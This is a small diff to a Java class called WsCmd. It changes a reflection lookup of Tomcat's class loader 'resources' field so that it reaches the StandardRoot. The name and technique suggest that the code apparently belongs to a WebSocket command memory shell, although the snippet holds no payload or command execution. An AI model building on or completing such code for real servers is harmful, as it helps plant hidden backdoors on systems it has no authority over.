@@ -20,7 +20,7 @@ public class WsCmd {
                     field = webappClassLoaderBase.getClass().getDeclaredField("resources");
                     field.setAccessible(true);
                 }catch (Exception e){
-                    field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
+                    field = webappClassLoaderBase.getClass().getSuperclass().getSuperclass().getDeclaredField("resources");
                     field.setAccessible(true);
                 }
                 standardroot = (StandardRoot)field.get(webappClassLoaderBase);
